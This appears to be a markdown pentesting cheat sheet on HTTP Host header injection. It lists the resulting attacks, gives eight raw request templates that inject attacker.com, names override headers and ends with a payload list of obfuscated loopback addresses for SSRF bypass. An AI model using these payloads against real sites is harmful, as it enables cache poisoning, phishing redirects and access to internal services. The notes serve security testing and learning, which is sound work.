# What is a Host Header Attack
Host header injection is a type of web vulnerability that involves manipulating the Host header in HTTP requests to potentially exploit web applications. This header is used by web servers to determine the hostname of the requested resource. If not properly validated or sanitized, attackers can exploit this header to perform various malicious activities.

### Host header exploit 
1.	**Web Cache Poisoning**:
	•	If a web application or cache server uses the Host header to generate cached responses, an attacker can manipulate the header to poison the cache with malicious content.
2.	**Open Redirects**:
	•	Attackers might use the Host header to exploit open redirect vulnerabilities. By injecting a malicious domain, they can trick users into visiting harmful sites.
3.	**Cross-Site Scripting (XSS)**:
	•	If the application includes the Host header in its response without proper sanitization, it might be possible for an attacker to inject malicious scripts that execute in the user’s browser.
4.	**Internal Resource Access**:
	•	An attacker might be able to exploit misconfigurations to access internal resources or services by manipulating the Host header to point to internal domains.
5.	**Security Misconfigurations**:
	•	Some applications might rely on the Host header to determine authorization rules or application behavior. Incorrect assumptions can lead to privilege escalation or unauthorized access.
6. **Routing-based-SSRF**
    - If an SSR application uses the Host header to determine which content or application logic to apply, an attacker could manipulate this header to redirect users or access unauthorized content.


**Example**
```
    GET / HTTP/1.1
    Host: www.epochcyber.in
    X-Forwarded-Host: www.attacker.com
    ...
```

### How to Exploit
1. Change The Host header value 
```
    GET /about HTTP/1.1 
    Host: www.attacker.com 
    ....

```
2. Use Double Host header value 
```
    GET /about HTTP/1.1
    Host: www.vulnerable-webiste.conm 
    Host: www.attacker.com
    ...
``` 
3. Add an absolute URL 
```
    GET https://Vulnerable-website.com HTTP/1.1
    Host: www.attacker.conm
    ...
``` 
4. Add Host override headers
```
    GET / HTTP/1.1
    Host: www.vulnerable-website.com
    X-Forwarded-Host: www.attacker.com
    ...
```
5. Some Website omit the port from the host header
```
    GET /example HTTP/1.1 
    Host: vulnerable-website.com:bad-stuff-here
    ...

```
6. use arbitary domain name ( for arbitary hostname, you register a hostname)
``` 
    GET /path HTTP/1.1
    Host: notvulnerable-website.com
    ...
```
7. try less secure domain 
```
    GET /path HTTP/1.1
    Host: hacked-subdomain.vulnerable-website.com
    ...
```
8. Add line wrapping 
```
    GET /path HTTP/1.1
            Host: www.attacker.com
    Host: Vulnerable-website.com
```
### you can use  similar host header
```
    1. X-Host
    2. X-Forwarded-Server
    3. X-HTTP-Host-Override
    4. Forwarded
```

### Headers to Change a Location
```
Connection: close, X-Forwarded-For (Check hop-by-hop headers)

```
### Host header value
```
127.0.0.1
localhost
127.0.0.2
127.0.1.1
127.1.1.1
127.255.255.254
::1
[::1]
127.0.0.1:80
localhost:8080
0x7f.0x0.0x0.0x1
2130706433
0177.0.0.01
localhost.localdomain
localhost.lan
::ffff:127.0.0.1
::ffff:127.0.0.1
0x7f.0.0.0x01
127.0.0x0.01
127.0x00.00.1
0b01111111.0b00000000.0b00000000.0b00000001
127.000.000.001
127.0000.0000.0001
127.000000000000.0.1
127.0.0.000001
localhost.测试 
localhost.пример 
test.internal
dev.localhost
myapp.local
0:0:0:0:0:0:0:1
0000:0000:0000:0000:0000:0000:0000:0001
```

### **References**
1. [Acunetix --> host header article ](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/)
2. [portswigger--> host header](https://portswigger.net/web-security/host-header/exploiting#how-to-test-for-vulnerabilities-using-the-http-host-header)